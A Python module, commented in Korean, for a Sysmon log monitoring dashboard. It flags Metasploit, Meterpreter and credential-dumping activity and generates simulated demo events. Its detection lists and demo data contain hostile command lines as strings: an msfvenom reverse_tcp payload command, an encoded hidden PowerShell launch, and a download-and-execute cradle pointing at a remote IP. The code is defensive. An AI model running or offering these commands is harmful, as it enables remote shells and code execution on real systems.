"""
Sysmon 로그 파서 모듈
Windows Sysmon 이벤트 로그를 읽어 분석
실행 환경이 Windows가 아니거나 Sysmon이 없을 경우 데모 데이터 사용
"""
import threading
import time
import random
from datetime import datetime
from collections import deque

try:
    # pywin32 일괄 가용성 확인 — 뒤 두 개는 직접 쓰지 않지만 함께 있어야
    # Windows 이벤트 로그 경로가 정상 동작한다.
    import win32evtlog
    import win32evtlogutil  # noqa: F401
    import win32con  # noqa: F401
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False


# Sysmon 이벤트 ID 매핑
SYSMON_EVENTS = {
    1:  {"name": "프로세스 생성",         "severity": "INFO"},
    2:  {"name": "파일 생성 시간 변경",   "severity": "MEDIUM"},
    3:  {"name": "네트워크 연결",          "severity": "INFO"},
    4:  {"name": "Sysmon 서비스 상태",    "severity": "INFO"},
    5:  {"name": "프로세스 종료",          "severity": "INFO"},
    6:  {"name": "드라이버 로드",          "severity": "HIGH"},
    7:  {"name": "이미지 로드",            "severity": "MEDIUM"},
    8:  {"name": "원격 스레드 생성",       "severity": "HIGH"},
    9:  {"name": "RawAccessRead",         "severity": "HIGH"},
    10: {"name": "프로세스 접근",          "severity": "HIGH"},
    11: {"name": "파일 생성",              "severity": "INFO"},
    12: {"name": "레지스트리 생성/삭제",   "severity": "MEDIUM"},
    13: {"name": "레지스트리 값 설정",     "severity": "MEDIUM"},
    14: {"name": "레지스트리 키 이름 변경","severity": "MEDIUM"},
    15: {"name": "파일스트림 생성",        "severity": "MEDIUM"},
    17: {"name": "파이프 생성",            "severity": "MEDIUM"},
    18: {"name": "파이프 연결",            "severity": "MEDIUM"},
    19: {"name": "WMI 이벤트 필터",       "severity": "HIGH"},
    20: {"name": "WMI 이벤트 소비자",     "severity": "HIGH"},
    21: {"name": "WMI 바인딩",            "severity": "HIGH"},
    22: {"name": "DNS 쿼리",              "severity": "INFO"},
    23: {"name": "파일 삭제",              "severity": "MEDIUM"},
    25: {"name": "프로세스 변조",          "severity": "CRITICAL"},
    26: {"name": "파일 삭제 감지",         "severity": "HIGH"},
    29: {"name": "파일 실행 감지",         "severity": "HIGH"},
}

SUSPICIOUS_PROCESSES = [
    "mimikatz", "meterpreter", "cobalt", "empire", "powersploit",
    "psexec", "wce.exe", "fgdump", "procdump", "gsecdump",
    "pwdump",
    # Metasploit 관련
    "msfconsole", "msfvenom", "msfd", "metasploit",
]
# cmd.exe, powershell.exe, lsass는 정상 사용이 잦아 의심 키워드에서 제외 (FP 감소)

SUSPICIOUS_PATHS = [
    "\\temp\\", "\\tmp\\", "\\appdata\\local\\temp\\",
    "\\users\\public\\", "\\windows\\temp\\",
]

# ═════════════════════ Metasploit / Meterpreter 탐지 시그니처 ═════════════════════
# Meterpreter 페이로드의 대표적인 행동 패턴
# (참고: Rapid7 Metasploit Framework, MITRE ATT&CK T1055/T1059/T1105)
METASPLOIT_SIGNATURES = {
    # 명령줄 키워드 — msfvenom 기본 페이로드와 흔한 리버스쉘 옵션
    "cmdline_keywords": [
        "/tvrvrcq",               # msfvenom 기본 쉘코드 문자열
        "metsrv.dll",             # Meterpreter 서버 DLL
        "reverse_tcp", "reverse_https", "reverse_http",
        "bind_tcp", "bind_https",
        "-p windows/meterpreter", "-p linux/x86/meterpreter",
        "msfvenom", "msfconsole",
        "exploit/multi/handler",
        "set payload windows/",
        # PowerShell 인코딩 실행 (Metasploit web_delivery 모듈)
        "powershell -nop -w hidden -e ",
        "powershell -noni -nop -w hidden",
        "iex (new-object net.webclient).downloadstring",
        # msfvenom shellcode loader 패턴
        "virtualalloc", "createremotethread",
    ],
    # 기본 Metasploit 리스너/페이로드 포트
    "default_ports": [4444, 4445, 5555, 8443, 1337, 31337],
    # Meterpreter가 자주 주입하는 대상 프로세스
    "injection_targets": ["notepad.exe", "explorer.exe", "spoolsv.exe",
                          "svchost.exe", "rundll32.exe"],
    # 레지스트리 지속성 패턴
    "persistence_keys": [
        "\\CurrentVersion\\Run",
        "\\CurrentVersion\\RunOnce",
        "\\Services\\",
    ],
}


def detect_metasploit(entry):
    """
    Sysmon 이벤트에서 Metasploit/Meterpreter 흔적을 탐지.
    반환: (탐지여부:bool, 탐지이유:str|None, MITRE_Technique:str|None)
    """
    msg = (entry.get("message") or "").lower()
    proc = (entry.get("process") or "").lower()
    eid  = entry.get("event_id")

    # 1) 커맨드라인/메시지 시그니처
    for sig in METASPLOIT_SIGNATURES["cmdline_keywords"]:
        if sig.lower() in msg:
            return True, f"Metasploit 시그니처 일치: '{sig}'", "T1059.001"

    # 2) 프로세스명
    if any(k in proc for k in ("msfvenom", "msfconsole", "meterpreter")):
        return True, f"Metasploit 도구 실행: {proc}", "T1059"

    # 3) 기본 리스너 포트로의 네트워크 연결 (Event ID 3)
    if eid == 3:
        for port in METASPLOIT_SIGNATURES["default_ports"]:
            if f"destinationport: {port}" in msg or f"port: {port}" in msg:
                return True, f"Metasploit 기본 포트로 연결 시도: {port}", "T1571"

    # 4) 원격 스레드 생성 (Event ID 8) — Meterpreter migrate 행위
    if eid == 8:
        for tgt in METASPLOIT_SIGNATURES["injection_targets"]:
            if tgt in msg:
                return True, f"의심 프로세스 인젝션 ({tgt}) — Meterpreter migrate 의심", "T1055"

    # 5) 프로세스 접근 (Event ID 10) — LSASS 접근은 Mimikatz/Meterpreter hashdump
    if eid == 10 and "lsass.exe" in msg:
        if "0x1010" in msg or "0x1410" in msg or "0x143a" in msg:
            return True, "LSASS 고권한 접근 — 자격증명 덤프 의심", "T1003.001"

    # 6) 인코딩된 PowerShell 실행 (Metasploit web_delivery 패턴)
    #    주의: 원래 주석은 "의심 경로에서"였으나 경로 검사는 구현된 적이 없다.
    #    image_path 기반 판정(Temp/AppData 실행 등)은 미구현 — docs/AUDIT.md 참조.
    if "powershell" in proc and ("-enc" in msg or "-encodedcommand" in msg):
        return True, "PowerShell 인코딩 실행 (Metasploit web_delivery 패턴)", "T1059.001"

    return False, None, None


class SysmonParser:
    LOG_CHANNEL_DEFAULT = "Microsoft-Windows-Sysmon/Operational"

    def __init__(self, socketio, config=None, mitre_tracker=None):
        self.socketio = socketio
        self.config = config
        self.mitre = mitre_tracker
        self.running = False
        # Sysmon 이벤트 채널 — config 에 선언돼 있었으나 읽히지 않아
        # 하드코딩된 채널만 열렸다(AUDIT F-1).
        self.log_channel = ((config or {}).get("SYSMON_LOG_CHANNEL")
                            or self.LOG_CHANNEL_DEFAULT)
        self.events = deque(maxlen=500)
        self._lock = threading.Lock()

        self.stats = {
            "total_events": 0,
            "process_create": 0,
            "network_connect": 0,
            "registry_changes": 0,
            "suspicious_events": 0,
            "critical_events": 0,
        }

    # ------------------------------------------------------------------ #

    def start(self, demo=True):
        if self.running:
            return
        self.running = True
        if not demo and WIN32_AVAILABLE:
            threading.Thread(target=self._read_win32_loop, daemon=True).start()
        else:
            threading.Thread(target=self._demo_loop, daemon=True).start()
        threading.Thread(target=self._emit_loop, daemon=True).start()

    def stop(self):
        self.running = False

    def get_events(self, limit=100, event_id=None, severity=None):
        with self._lock:
            result = list(self.events)
        if event_id:
            result = [e for e in result if e["event_id"] == event_id]
        if severity:
            result = [e for e in result if e["severity"] == severity]
        return list(reversed(result))[:limit]

    def get_stats(self):
        with self._lock:
            return dict(self.stats)

    # ------------------------------------------------------------------ #
    #  Windows 이벤트 로그 읽기
    # ------------------------------------------------------------------ #

    def _read_win32_loop(self):
        try:
            handle = win32evtlog.OpenEventLog(None, self.log_channel)
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            last_record = 0  # 이미 처리한 레코드 번호 — 중복 재처리 방지
            while self.running:
                records = win32evtlog.ReadEventLog(handle, flags, 0)
                new_records = [r for r in (records or [])
                               if r.RecordNumber > last_record]
                if not new_records:
                    time.sleep(1)
                    continue
                last_record = max(r.RecordNumber for r in new_records)
                for rec in new_records:
                    self._process_win32_record(rec)
        except Exception as e:
            print(f"[SysmonParser] Windows 이벤트 읽기 오류: {e} — 데모 모드로 전환")
            self._demo_loop()

    def _process_win32_record(self, rec):
        event_id = rec.EventID & 0xFFFF
        event_meta = SYSMON_EVENTS.get(event_id, {"name": f"이벤트 {event_id}", "severity": "INFO"})
        entry = {
            "event_id": event_id,
            "event_name": event_meta["name"],
            "severity": event_meta["severity"],
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "source": "Sysmon",
            "message": str(rec.StringInserts)[:300] if rec.StringInserts else "",
            "suspicious": False,
        }
        self._check_suspicious(entry)
        self._record_event(entry)

    # ------------------------------------------------------------------ #
    #  Demo 루프
    # ------------------------------------------------------------------ #

    _DEMO_PROCESSES = [
        ("explorer.exe",    "C:\\Windows\\explorer.exe",         "C:\\Windows\\System32\\userinit.exe"),
        ("chrome.exe",      "C:\\Program Files\\Chrome\\chrome.exe", "C:\\Windows\\explorer.exe"),
        ("powershell.exe",  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmd.exe"),
        ("cmd.exe",         "C:\\Windows\\System32\\cmd.exe",    "services.exe"),
        ("svchost.exe",     "C:\\Windows\\System32\\svchost.exe","services.exe"),
        ("mimikatz.exe",    "C:\\Users\\Public\\mimikatz.exe",   "cmd.exe"),  # 악성
        ("wscript.exe",     "C:\\Windows\\System32\\wscript.exe","explorer.exe"),
        ("regsvr32.exe",    "C:\\Windows\\System32\\regsvr32.exe","cmd.exe"),
        ("msfvenom.exe",    "C:\\Users\\Public\\msfvenom.exe",   "cmd.exe"),  # Metasploit
    ]

    # Metasploit 데모 시나리오 — 5~10분에 한 번씩 랜덤하게 등장
    _DEMO_METASPLOIT_EVENTS = [
        {"event_id": 1,  "msg": "Image: C:\\Users\\Public\\msfvenom.exe | CommandLine: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /tmp/payload.exe"},
        {"event_id": 1,  "msg": "Image: C:\\Windows\\System32\\powershell.exe | CommandLine: powershell -nop -w hidden -e JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4A..."},
        {"event_id": 3,  "msg": "Process: notepad.exe | DestinationIp: 45.33.32.156 | DestinationPort: 4444 | Protocol: tcp"},
        {"event_id": 8,  "msg": "SourceImage: C:\\Temp\\beacon.exe | TargetImage: C:\\Windows\\System32\\notepad.exe | NewThreadId: 4220"},
        {"event_id": 10, "msg": "SourceImage: C:\\Users\\Public\\svc.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1410"},
        {"event_id": 1,  "msg": "Image: cmd.exe | CommandLine: cmd /c iex (new-object net.webclient).downloadstring('http://45.33.32.156:8080/abc')"},
    ]

    _DEMO_DOMAINS = [
        "update.microsoft.com", "google.com", "evil-c2.xyz",
        "malware-beacon.ru", "github.com", "amazonaws.com",
        "192.168.1.254", "8.8.8.8", "45.33.32.156",
    ]

    _DEMO_REG_KEYS = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\payload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware_svc",
    ]

    def _demo_loop(self):
        time.sleep(0.5)
        # 초기 이벤트 (적은 양)
        for _ in range(random.randint(3, 6)):
            self._demo_generate()
            time.sleep(0.1)

        while self.running:
            # 주기 완화: 3~8초
            time.sleep(random.uniform(3.0, 8.0))
            self._demo_generate()

    def _demo_generate(self):
        # 3% 확률로 Metasploit 공격 시나리오 발생
        if random.random() < 0.03:
            self._demo_metasploit_event()
            return

        event_id = random.choices(
            list(SYSMON_EVENTS.keys()),
            weights=[10, 2, 8, 1, 3, 2, 2, 2, 1, 3, 5, 3, 3, 1, 2, 2, 2, 1, 1, 1, 1, 6, 2, 1, 1],
            k=1
        )[0]
        meta = SYSMON_EVENTS[event_id]
        # mimikatz 등 악성 프로세스는 5% 확률만 등장
        proc_weights = [12, 12, 8, 6, 12, 1, 3, 3, 1]
        proc, path, parent = random.choices(self._DEMO_PROCESSES, weights=proc_weights, k=1)[0]

        if event_id == 1:
            msg = f"Image: {path} | CommandLine: {proc} | ParentImage: {parent}"
        elif event_id == 3:
            domain = random.choice(self._DEMO_DOMAINS)
            dst_port = random.choice([80, 443, 4444, 8080, 53])
            msg = f"Process: {proc} | DestinationHostname: {domain} | DestinationPort: {dst_port}"
        elif event_id in (12, 13, 14):
            key = random.choice(self._DEMO_REG_KEYS)
            msg = f"EventType: SetValue | TargetObject: {key}"
        elif event_id == 22:
            msg = f"QueryName: {random.choice(self._DEMO_DOMAINS)}"
        else:
            msg = f"Process: {proc} | Image: {path}"

        entry = {
            "event_id": event_id,
            "event_name": meta["name"],
            "severity": meta["severity"],
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "source": "Sysmon (Demo)",
            "process": proc,
            "image_path": path,
            "parent_process": parent,
            "message": msg,
            "suspicious": False,
        }
        self._check_suspicious(entry)
        self._record_event(entry)

    def _demo_metasploit_event(self):
        """Metasploit 공격 시나리오를 모사하는 Sysmon 이벤트 생성."""
        scenario = random.choice(self._DEMO_METASPLOIT_EVENTS)
        eid   = scenario["event_id"]
        meta  = SYSMON_EVENTS.get(eid, {"name": f"이벤트 {eid}", "severity": "HIGH"})
        entry = {
            "event_id":     eid,
            "event_name":   meta["name"],
            "severity":     "CRITICAL",
            "timestamp":    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "source":       "Sysmon (Demo/Metasploit)",
            "process":      "msfvenom.exe" if eid == 1 else "beacon.exe",
            "image_path":   "C:\\Users\\Public\\payload.exe",
            "parent_process": "cmd.exe",
            "message":      scenario["msg"],
            "suspicious":   False,
        }
        self._check_suspicious(entry)
        self._record_event(entry)

    # ------------------------------------------------------------------ #

    def _check_suspicious(self, entry):
        msg_lower = entry.get("message", "").lower()
        proc_lower = entry.get("process", "").lower()
        path_lower = entry.get("image_path", "").lower()

        # 1) Metasploit/Meterpreter 전용 탐지 (우선)
        ms_hit, ms_reason, ms_tech = detect_metasploit(entry)
        if ms_hit:
            entry["suspicious"] = True
            entry["severity"]   = "CRITICAL"
            entry["alert"]      = f"[Metasploit] {ms_reason}"
            entry["metasploit"] = True
            entry["mitre_technique"] = ms_tech
            return

        for sus in SUSPICIOUS_PROCESSES:
            if sus in msg_lower or sus in proc_lower:
                entry["suspicious"] = True
                entry["severity"] = "CRITICAL" if sus in ("mimikatz", "meterpreter", "msfvenom") else "HIGH"
                entry["alert"] = f"의심 프로세스 감지: {sus}"
                break

        for sus_path in SUSPICIOUS_PATHS:
            if sus_path in path_lower:
                entry["suspicious"] = True
                entry["alert"] = f"의심 경로에서 실행: {entry.get('image_path', '')}"
                break

    def _record_event(self, entry):
        with self._lock:
            self.events.append(entry)
            self.stats["total_events"] += 1
            eid = entry["event_id"]
            if eid == 1:
                self.stats["process_create"] += 1
            elif eid == 3:
                self.stats["network_connect"] += 1
            elif eid in (12, 13, 14):
                self.stats["registry_changes"] += 1
            if entry.get("suspicious"):
                self.stats["suspicious_events"] += 1
            if entry["severity"] == "CRITICAL":
                self.stats["critical_events"] += 1

        if entry.get("suspicious"):
            self.socketio.emit("sysmon_alert", entry)

        # MITRE ATT&CK 매핑
        if self.mitre:
            try:
                # Metasploit 탐지는 전용 위협 타입으로 매핑 (CRITICAL 승격)
                if entry.get("metasploit"):
                    self.mitre.map_threat(
                        "METASPLOIT",
                        description=entry.get("alert") or entry.get("message", "")[:160],
                        severity="CRITICAL",
                    )
                self.mitre.map_sysmon_event(
                    entry["event_id"],
                    process=entry.get("process"),
                    message=entry.get("message", ""),
                    severity=entry.get("severity"),
                )
            except Exception:
                pass

    def _emit_loop(self):
        while self.running:
            with self._lock:
                payload = {
                    "stats": dict(self.stats),
                    "recent_events": list(self.events)[-20:],
                }
            self.socketio.emit("sysmon_update", payload)
            time.sleep(3)
